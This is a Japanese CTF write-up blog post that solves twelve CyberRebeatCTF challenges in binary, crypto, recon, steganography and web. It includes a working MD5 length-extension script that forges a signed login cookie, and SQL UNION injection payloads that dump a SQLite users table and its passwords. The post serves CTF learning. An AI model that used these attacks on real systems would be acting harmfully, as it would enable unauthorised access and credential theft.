---
layout: post
title: CyberRebeatCTF の write-up
categories: [ctf]
date: 2018-09-09 19:13:00 +0900
---

チーム Harekaze で [CyberRebeatCTF](https://ennach.sakura.ne.jp/CyberRebeatCTF/index_jp.html) に参加しました。最終的にチームで 5309 点を獲得し、順位は得点 154 チーム中 1 位 (最初に全完!) でした。うち、私は 12 問を解いて 2946 点を入れました。

以下、解いた問題の write-up です。

## [Binary 377] f31337

`f31337` というファイルが与えられました。`file` でどのようなファイルか確認します。

```
$ file f31337
f31337: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=357b227fbf18006edc995eaabb2d243d4584a7d3, not stripped
```

amd64 の ELF のようです。`objdump` で逆アセンブルしてみます。

```
00000000004005e6 <main>:
  4005e6:	48 83 ec 18          	sub    rsp,0x18
  4005ea:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  4005f1:	00 00 
  4005f3:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
  4005f8:	31 c0                	xor    eax,eax
  4005fa:	bf 69 7a 00 00       	mov    edi,0x7a69
  4005ff:	e8 b2 ff ff ff       	call   4005b6 <f>
  400604:	48 89 04 24          	mov    QWORD PTR [rsp],rax
  400608:	ba 00 00 00 00       	mov    edx,0x0
  40060d:	89 d1                	mov    ecx,edx
  40060f:	c1 f9 1f             	sar    ecx,0x1f
  400612:	c1 e9 1d             	shr    ecx,0x1d
  400615:	8d 04 11             	lea    eax,[rcx+rdx*1]
  400618:	83 e0 07             	and    eax,0x7
  40061b:	29 c8                	sub    eax,ecx
  40061d:	48 98                	cdqe   
  40061f:	0f b6 04 04          	movzx  eax,BYTE PTR [rsp+rax*1]
  400623:	30 82 40 10 60 00    	xor    BYTE PTR [rdx+0x601040],al
  400629:	48 83 c2 01          	add    rdx,0x1
  40062d:	48 83 fa 1b          	cmp    rdx,0x1b
  400631:	75 da                	jne    40060d <main+0x27>
  400633:	c6 05 21 0a 20 00 00 	mov    BYTE PTR [rip+0x200a21],0x0        # 60105b <FLAG+0x1b>
  40063a:	ba 40 10 60 00       	mov    edx,0x601040
  40063f:	be 04 07 40 00       	mov    esi,0x400704
  400644:	bf 01 00 00 00       	mov    edi,0x1
  400649:	b8 00 00 00 00       	mov    eax,0x0
  40064e:	e8 4d fe ff ff       	call   4004a0 <__printf_chk@plt>
  400653:	b8 00 00 00 00       	mov    eax,0x0
  400658:	48 8b 74 24 08       	mov    rsi,QWORD PTR [rsp+0x8]
  40065d:	64 48 33 34 25 28 00 	xor    rsi,QWORD PTR fs:0x28
  400664:	00 00 
  400666:	74 05                	je     40066d <main+0x87>
  400668:	e8 13 fe ff ff       	call   400480 <__stack_chk_fail@plt>
  40066d:	48 83 c4 18          	add    rsp,0x18
  400671:	c3                   	ret    
  400672:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  400679:	00 00 00 
  40067c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
```

`FLAG` (`41 4F 1B DA 37 D8 F3 F3 50 16 00 CD 37 84 B4 CF 4E 4C 1C D1 37 D3 F4 E3 4C 5E 4F`) と `f(31337)` の結果を xor して出力しているようです。`f` を逆アセンブルしてみます。

```
00000000004005b6 <f>:
  4005b6:	b8 01 00 00 00       	mov    eax,0x1
  4005bb:	83 ff 01             	cmp    edi,0x1
  4005be:	7e 24                	jle    4005e4 <f+0x2e>
  4005c0:	55                   	push   rbp
  4005c1:	53                   	push   rbx
  4005c2:	48 83 ec 08          	sub    rsp,0x8
  4005c6:	89 fb                	mov    ebx,edi
  4005c8:	8d 7f ff             	lea    edi,[rdi-0x1]
  4005cb:	e8 e6 ff ff ff       	call   4005b6 <f>
  4005d0:	48 89 c5             	mov    rbp,rax
  4005d3:	8d 7b fe             	lea    edi,[rbx-0x2]
  4005d6:	e8 db ff ff ff       	call   4005b6 <f>
  4005db:	48 01 e8             	add    rax,rbp
  4005de:	48 83 c4 08          	add    rsp,0x8
  4005e2:	5b                   	pop    rbx
  4005e3:	5d                   	pop    rbp
  4005e4:	f3 c3                	repz ret 
```

C っぽく直します。

```c
long long f(int x) {
  if (x == 1) {
    return 1;
  }
  return f(x - 1) + f(x - 2);
}
```

`f(x)` は x 番目のフィボナッチ数を返す関数だとわかりました。

```python
from pwn import *

def fib(x):
  a, b = 0, 1
  for _ in range(x):
    a, b = b, a + b
  return b & 0xffffffffffffffff

s = '41 4F 1B DA 37 D8 F3 F3 50 16 00 CD 37 84 B4 CF 4E 4C 1C D1 37 D3 F4 E3 4C 5E 4F'.replace(' ', '').decode('hex')
print 'CRCTF{' + xor(s, p64(fib(31337))) + '}'
```

```
$ python2 solve.py
CRCTF{y0ur_m4chine_1s_v3ry_f3st!!}
```

フラグが得られた…はずですが、このまま投げても通りません。悩んでいると、[@h_noson](https://twitter.com/h_noson) さんが `f3st` を `f4st` に置換して通されていました。

```
CRCTF{y0ur_m4chine_1s_v3ry_f4st!!}
```

## [Crypto 419] Signature

以下のようなソースコードが与えられました。

```php
<html>
<body style="background-color:#715638;color:white">

  <a href = "index.php">return</a><br />

<?php

if($_COOKIE == null
  || !isset($_COOKIE["DataCookie"])
  || !isset($_COOKIE["Signature"])) {
  echo "Login failed!";
  return;
}

parse_str($_COOKIE["DataCookie"], $parse);
if ($parse == null
  || !isset($parse["logged_in"])
  || $parse["logged_in"] ===  "0"
  || !isset($parse["id"])) {
  echo "Login failed : invalid parameters!";
  return;
}
$salt = getenv('SIGNATURE_FLAG');
$data = "logged_in={$parse["logged_in"]}&id={$parse["id"]}";
$signature = md5($salt. $data);

if($signature !== $_COOKIE["Signature"]) {
  echo "Login failed : invalid signature!";
  return;
}

?>

<br />
Login successful!<br />
ID:<?php echo $parse["id"];  ?><br />

<?php
if($parse["id"] === "Kana") {
  echo "FLAG: CRCTF{% raw %}{{$salt}}{% endraw %}";
}

?>

<br />
</body>
</html>
```

`Kana` でログインすればよいようですが、`$salt` が不明なため署名はそのままでは得られません。ですが、`$signature = md5($salt. $data);` ということなので Length Extension Attack ができそうです。

ログインに失敗した場合、以下のような Cookie が発行されていました。

```
Set-Cookie: DataCookie=logged_in=0
Set-Cookie: Signature=11606044ea561db956665279b3073f35
```

[bwall/HashPump](https://github.com/bwall/HashPump) を使えば `DataCookie` の後ろに `1&id=Kana` を追加し、その署名を得られそうです。が、このままでは `DataCookie` に null バイトが含まれてしまうため、以下のように `parse_str` で失敗してしまいます。

```
>>> parse_str("a=1&b=2\0&c=3", $parse); var_dump($parse);
array(2) {
  ["a"]=>
  string(1) "1"
  ["b"]=>
  string(1) "2"
}
```

ここで悩んでいたところ、[@zeosutt](https://twitter.com/zeosutt) さんが null バイトを `%00` に置換すれば通ることを発見されました。

これを利用して、以下のスクリプトを実行するとフラグが得られました。

```python
import urllib
import requests
import hashpumpy

i = 1
while True:
  sig, data = hashpumpy.hashpump('11606044ea561db956665279b3073f35', 'logged_in=0', '1&id=Kana', i)
  r = requests.get('http://signature.cyberrebeat.adctf.online/login.php', cookies={
    'DataCookie': urllib.quote(data).replace('%00', '%2500'),
    'Signature': sig
  })
  print i, r.content
  i += 1
  raw_input('next?')
```

```
$ python s.py
...
27 <html>
<body style="background-color:#715638;color:white">

  <a href = "index.php">return</a><br />


<br />
Login successful!<br />
ID:Kana<br />

FLAG: CRCTF{Two years ago, August 31st.}
```

`CRCTF{Two years ago, August 31st.}`

## [Misc 377] Opening Movie

与えられた URL にアクセスすると `Please watch this video 300 times!` と表示されました。Chrome で DevTools の Network タブを見ていると `MoviePlayer.dll` や `Microsoft.AspNetCore.Blazor.Browser.dll` のような dll ファイルがダウンロードされていることが確認できました。

`MoviePlayer.dll` を [dnSpy](https://github.com/0xd4d/dnSpy) でデコンパイルすると以下のようなコードが得られました。

```csharp
using System;
using System.Security.Cryptography;
using System.Text;
using Microsoft.AspNetCore.Blazor;
using Microsoft.AspNetCore.Blazor.Browser.Interop;
using Microsoft.AspNetCore.Blazor.Components;
using Microsoft.AspNetCore.Blazor.Layouts;
using Microsoft.AspNetCore.Blazor.RenderTree;

namespace MoviePlayer.Pages
{
	// Token: 0x02000007 RID: 7
	[Layout, Route("/")]
	public class Index : BlazorComponent
	{
		// Token: 0x0600000C RID: 12 RVA: 0x00002190 File Offset: 0x00000390
		protected override void BuildRenderTree(RenderTreeBuilder builder)
		{
			base.BuildRenderTree(builder);
			builder.OpenElement(0, "h1");
			builder.AddContent(1, "CyberRebeat OP Movie");
			builder.CloseElement();
			builder.AddContent(2, "\n\n");
			builder.OpenElement(3, "div");
			builder.AddContent(4, "Please watch this video 300 times!");
			builder.CloseElement();
			builder.AddContent(5, "\n");
			builder.OpenElement(6, "div");
			builder.AddContent(7, "Count:");
			builder.AddContent(8, this.count);
			builder.CloseElement();
			builder.OpenElement(9, "br");
			builder.CloseElement();
			builder.AddContent(10, "\n\n");
			if (this.count >= 300)
			{
				builder.AddContent(11, "\t");
				builder.OpenElement(12, "div");
				builder.AddAttribute(13, "class", "div");
				builder.AddContent(14, "FLAG:");
				builder.CloseElement();
				builder.AddContent(15, "\n\t");
				builder.OpenElement(16, "iframe");
				builder.AddAttribute(17, "src", this.txt);
				builder.CloseElement();
				builder.AddContent(18, "\n");
			}
			builder.AddContent(19, "\n");
			builder.OpenElement(20, "button");
			builder.AddAttribute(21, "class", "btn btn-primary");
			builder.AddAttribute(22, "onclick", BindMethods.GetEventHandlerValue<UIMouseEventArgs>(new Action(this.startVideo)));
			builder.AddContent(23, "Start");
			builder.CloseElement();
			builder.OpenElement(24, "br");
			builder.CloseElement();
			builder.AddContent(25, "\n\n");
			builder.OpenElement(26, "video");
			builder.AddAttribute(27, "id", "v");
			builder.AddAttribute(28, "src", "OP.mp4");
			builder.CloseElement();
		}

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x0600000D RID: 13 RVA: 0x00002388 File Offset: 0x00000588
		private string txt
		{
			get
			{
				return this.encrypt("FLAG_IS_HERE") + ".txt";
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000023A0 File Offset: 0x000005A0
		private void startVideo()
		{
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = now - this.current;
			if (timeSpan.TotalSeconds < 147.0)
			{
				RegisteredFunction.Invoke<object>("Warning", new object[]
				{
					(int)timeSpan.TotalSeconds
				});
				return;
			}
			this.count++;
			RegisteredFunction.InvokeUnmarshalled<object>("MovieStart");
			this.current = DateTime.Now;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002418 File Offset: 0x00000618
		private string encrypt(string str)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(str))).ToLower().Replace("-", "");
		}

		// Token: 0x04000003 RID: 3
		private int count;

		// Token: 0x04000004 RID: 4
		private DateTime current = DateTime.MinValue;
	}
}
```

`/450646811a49819cf6bc2d372185aa35.txt` にアクセスするとフラグが得られました。

```
CRCTF{to the twilight of the internet}
```

## [Recon 113] Tweet

<blockquote class="twitter-tweet" data-lang="ja"><p lang="en" dir="ltr">CRCTF{CyberRebeatCTF_has_started!}</p>&mdash; CyberRebeat (@CyberRebeat) <a href="https://twitter.com/CyberRebeat/status/1038306822602416128?ref_src=twsrc%5Etfw">2018年9月8日</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

```
CRCTF{CyberRebeatCTF_has_started!}
```

## [Recon 134] CyberRebeatScripts

> Do you know Github?

ということなので GitHub で `CyberRebeat` を検索すると [ennach/CyberRebeatScripts: CyberRebeat's script files](https://github.com/ennach/CyberRebeatScripts) というリポジトリが見つかりました。

コミット履歴を調べると、[delete FLAG](https://github.com/ennach/CyberRebeatScripts/commit/86cc1779522ad0708ad0b829935b08ac42b2588d) というそれっぽいコミットが見つかりました。

```
CRCTF{I cut down her gag in a single strike}
```

## [Recon 215] ChangeHistory

GitHub で `CyberRebeat` を検索すると [ennach/ChangeHistory: CyberRebeat's scripts 2](https://github.com/ennach/ChangeHistory) というリポジトリが見つかります。

Issues を見ると [[ToDo] I committed the FLAG by mistake! · Issue #1 · ennach/ChangeHistory](https://github.com/ennach/ChangeHistory/issues/1) という Issue が見つかりました。

> That commit hash is c476614bc439fe1910e494422b3aa207b776d486

ということなので [plain texts · ennach/ChangeHistory@c476614](https://github.com/ennach/ChangeHistory/commit/c476614bc439fe1910e494422b3aa207b776d486) にアクセスするとフラグが得られました。

```
CRCTF{the timer is set to 120 seconds}
```

## [Stegano 121] Secret.pdf

フラグが黒塗りで潰された PDF ファイルが与えられました。全選択 → コピー&ペーストでフラグが得られました。

```
CRCTF{I don't know of a time without the internet}
```

## [Stegano 218] Alpha

PNG ファイルが与えられました。stegsolve.jar で透明度の LSB だけを表示させるとフラグが得られました。

```
CRCTF{ALPHA_IS_THE_NAME_OF_A_HACKER_IN_CYBERREBEAT}
```

## [Stegano 414] Last 5 boxes

MP4 ファイルが与えられました。`binwalk` に投げてみると以下のような結果が得られました。

```
$ binwalk a4e796eabf01249f6eb8d565ee66849a5bacb472d4ea8adcc6b4dda8f97d318c.mp4
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
3168548       0x305924        MySQL MISAM compressed data file Version 6
7049532       0x6B913C        MySQL MISAM index file Version 8
20998118      0x14067E6       PNG image, 800 x 120, 8-bit/color RGB, non-interlaced
```

後ろの方に PNG があるようです。抽出し表示してみたものの、どうやら壊れているようです。バイナリエディタで確認してみると、IDAT チャンクのサイズの値と IDAT チャンクから次の IEND チャンクまでの距離が一致していません。

[Header Reader MP4](https://dev.onionsoft.net/seed/info.ax?id=1303) を使って与えられた MP4 ファイルを確認すると、PNG ファイルは最後の 5 つの `uuid` の Box で構成されていました。

24 バイトのヘッダ (参照: [MP4(コンテナ) - 1.Box構造 - あるべるのIT関連メモ](https://albel06.hatenablog.com/entry/2017/12/20/205103)) を削除し結合すると、フラグの書かれた壊れていない PNG が得られました。

```
CRCTF{Ever since we were born, we've had the net}
```

## [Web 119] White page

`Hiro` / `LittleGarden` という認証情報と URL が与えられました。アクセスしてみると以下のような HTML が返ってきました。

```html
<html>
<head>
  <title>NOAH.P</title>
  <style>
  button {
    margin-top:100px;
  }
  </style>
</head>
<body>
  <form action="index.php" method="post">
   <input type="text" name="id" style="visibility:hidden" />
   <input type="text" name="password" style="visibility:hidden" />
   <button>LOGIN</button>
  </form>
</body>
</html>
```

`input` の `style` を削除し、与えられた認証情報を入力するとフラグが得られました。

```
CRCTF{All I typed were four letters.}
```

## [Web 155] Let's Tweet!

以下のようなソースコードが与えられました。

```php
<html>
<body>
  <form action="LetsTweet.php" method="post">
    Let's tweet and post its URL!<br>
    Even if you don't want to do or you don't have twitter account, you can get the flag.<br>
    <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-text="I'm playing in CyberRebeatCTF now!" data-url="https://ennach.sakura.ne.jp/CyberRebeatCTF/" data-hashtags="CyberRebeatCTF" data-show-count="false">Tweet</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br /><br />

    以下のツイートを行い、そのURLの送信をお願いします！<br>
    もしツイートしたくない、あるいはツイッターのアカウントを持っていないという場合でも、FLAGの取得は可能です。<br>
    <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-text="CyberRebeatCTF 参加中！" data-url="https://ennach.sakura.ne.jp/CyberRebeatCTF/index_jp.html" data-hashtags="CyberRebeatCTF" data-show-count="false">Tweet</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br /><br />

   <input type="text" name="url" placeholder="https://twitter.com/..." style="width:500px" /><br /><br />
   <button>POST</button><br />
  </form>

  <div>

<?php
$url = isset($_POST["url"]) ? $_POST["url"] : "";

if($url == "") { return; }

if (!preg_match("/^https:\/\/twitter.com\/([A-Za-z0-9_]*?)\/status\/[0-9]*$/", $url)) {
  echo "Please enter a valid tweet URL.";
  return;
}

$content = file_get_contents($url);
if (strpos($content, '#CyberRebeatCTF') === false) {
  echo "Please enter a valid tweet URL.";
  return;
}

$db = new SQLite3('test.db');
$stmt = $db->prepare('SELECT COUNT(url) FROM Tweets WHERE url = ?');
$stmt->bindValue(1, $url, SQLITE3_TEXT);
$result = $stmt->execute();

if ($result->fetchArray()[0] > 0) {
  echo "This URL already exists!";
  return;
}

$flag = getenv('TWEET_FLAG');
echo "FLAG:CRCTF{% raw %}{{$flag}}{% endraw %}";

$stmt = $db->prepare('INSERT INTO Tweets (url) VALUES (?)');
$stmt->bindValue(1, $url, SQLITE3_TEXT);
$stmt->execute();

$db->close();
 ?>

</div>
</body>
</html>
```

`#CyberRebeatCTF` が含まれるツイートの URL を POST すればよいようです。Twitter で `#CyberRebeatCTF` を検索し、出てきたツイートの URL の screen_name を適当なものに変え POST するとフラグが得られました。

```
CRCTF{Thank_you_for_your_tweet!}
```

## [Web 284] Uploader

アップローダーの URL が与えられました。ファイル名で検索できるフォームがあったので `'` を検索してみると以下のようなエラーが返ってきました。

```
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'" in /var/www/html/index.php on line 37

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/index.php:38 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 38
```

SQLite3 が使われていることがわかります。`' union select sql, 2, 3, 4 from sqlite_master;--` を検索してみると以下のような結果が返ってきました。

```
ID	FileName	Published	UploadUser
1	circlecut.jpg	　2018-04-01　	guest
2	prologue_en.txt	　2018-05-15　	guest
3	prologue_jp.txt	　2015-05-14　	guest
4	rough_misa.jpg	　2018-05-20　	guest
5	sample.zip	　2018-07-01　	guest
CREATE TABLE "Files" ( `id`	INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, `file_name`	TEXT NOT NULL, `publication_date`	INTEGER NOT NULL, `upload_userid`	TEXT )	2	　3　	4
CREATE TABLE `Users` ( `userid`	TEXT NOT NULL, `password`	TEXT NOT NULL )	2	　3　	4
CREATE TABLE sqlite_sequence(name,seq)	2	　3　	4
```

`Users` の内容を `' union select userid, password, 3, 4 from users;--` で抜き出してみます。

```
ID	FileName	Published	UploadUser
1	circlecut.jpg	　2018-04-01　	guest
2	prologue_en.txt	　2018-05-15　	guest
3	prologue_jp.txt	　2015-05-14　	guest
4	rough_misa.jpg	　2018-05-20　	guest
5	sample.zip	　2018-07-01　	guest
guest	guest	　3　	4
harada	seishin0129	　3　	4
```

`harada` / `seishin0129` でログインしてみると以下のようなアップロード履歴が表示されました。

```
ID	FileName	PublicationDate	ZipPassword
6	secret.zip	　2018-09-20　	554587c5adc54a2a2e6f	
```

`secret.zip` というファイルをダウンロードし、`554587c5adc54a2a2e6f` というパスワードで展開するとフラグが得られました。

```
CRCTF{Today's_internet_is_full_of_concerning_vulnerabilities}
```